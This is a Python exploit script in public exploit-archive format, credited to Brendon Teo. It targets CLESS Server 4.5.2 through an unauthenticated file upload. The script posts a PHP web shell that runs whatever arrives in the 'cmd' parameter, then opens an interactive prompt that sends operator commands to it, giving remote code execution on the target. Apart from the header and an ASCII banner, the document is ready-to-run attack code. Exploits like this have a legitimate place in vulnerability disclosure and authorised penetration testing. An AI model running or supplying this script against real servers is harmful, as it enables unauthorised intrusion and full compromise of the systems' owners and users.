# Exploit Title: CLESS Server 4.5.2 - Unauthenticated Arbitrary File Upload leading to RCE
# Date: 18 June 2024
# Exploit Author: Brendon Teo
# Software Link: https://www.closed-loop.biz
# Version: CLESS Server 4.5.2
# CVE : 

import requests
import argparse
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.Session()

def execShell(url, filename):
    print("[+] Initializing shell... ")
    target = f"{url}/media/uploads/1/{filename}.php"
    res = s.get(target, verify=False)

    if res.status_code == 200:
        loop = True
        while loop:
            command = input("Please enter your command (or 'exit' to quit): ")

            if command.lower() == 'exit':
                loop = False
                break

            # Sends command to the PHP shell and prints the response
            command_url = f"{target}?cmd={command.strip()}"
            command_res = s.get(command_url, verify=False)
            
            if command_res.status_code == 200:
                print(command_res.text.strip())  # Prints the output of the command
            else:
                print(f"[-] Command execution failed (Status Code: {command_res.status_code})")

    else:
        print("[-] Exploit failed! PHP shell not found.")

def uploadShell(url):

    random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8))  # Generate a random filename
    target = f"{url}/treemedia/1/media_upload"
    headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryUcfC196K8KBmve66", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=1, i", "Connection": "close"}
    shell = f"------WebKitFormBoundaryUcfC196K8KBmve66\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"{random_filename}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundaryUcfC196K8KBmve66--\r\n"
    res = s.post(target, headers=headers, data=shell, verify=False)

    if res.status_code == 200:
        print(f"[+] Shell uploaded successfully! Filename: {random_filename}.php")
        return random_filename
    else:
        print("[-] Upload failed.. Please try again.")
        return None

def main():
    print("   ______  _____    ________   ______   ______   ")
    print(" .' ___  ||_   _|  |_   __  |.' ____ \.' ____ \  ")
    print("/ .'   \_|  | |      | |_ \_|| (___ \_| (___ \_| ")
    print("| |         | |   _  |  _| _  _.____`. _.____`.  ")
    print("\ `.___.'\ _| |__/ |_| |__/ || \____) | \____) | ")
    print(" `.____ .'|________|________| \______.'\______.' ")
    print("                                                 ")
    print(" _    _    _______      _____                    ")
    print("| |  | |  |  _____|    / ___ `.                  ")
    print("| |__| |_ | |____     |_/___) |                  ")
    print("|____   _|'_.____''.   .'____.'                  ")
    print("    _| |_ | \____) | _/ /_____                   ")
    print("   |_____(_)______.'(_)_______|                  ")
    print("                                                 ")
    print(" _______      ______  ________                   ")
    print("|_   __ \   .' ___  ||_   __  |                  ")
    print("  | |__) | / .'   \_|  | |_ \_|                  ")
    print("  |  __ /  | |         |  _| _                   ")
    print(" _| |  \ \_\ `.___.'\ _| |__/ |                  ")
    print("|____| |___|`.____ .'|________|                  ")
    print("                                                 ")

    print("================================================")
    print("|         CLESS Server 4.5.2                    |")
    print("|  Unauthenticated Arbitrary File Upload        |")
    print("|      Leading to RCE CVE Exploitation          |")
    print("|                                               |")
    print("|             by Brendon Teo                    |")
    print("===============================================")
    print("")


    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, help='url of the target', required=True)
    args = parser.parse_args()
    url = args.url

    filename = uploadShell(url)
    if filename:
        execShell(url, filename)
    else:
        print("Upload failed. Exiting...")

if __name__ == "__main__":
    main()

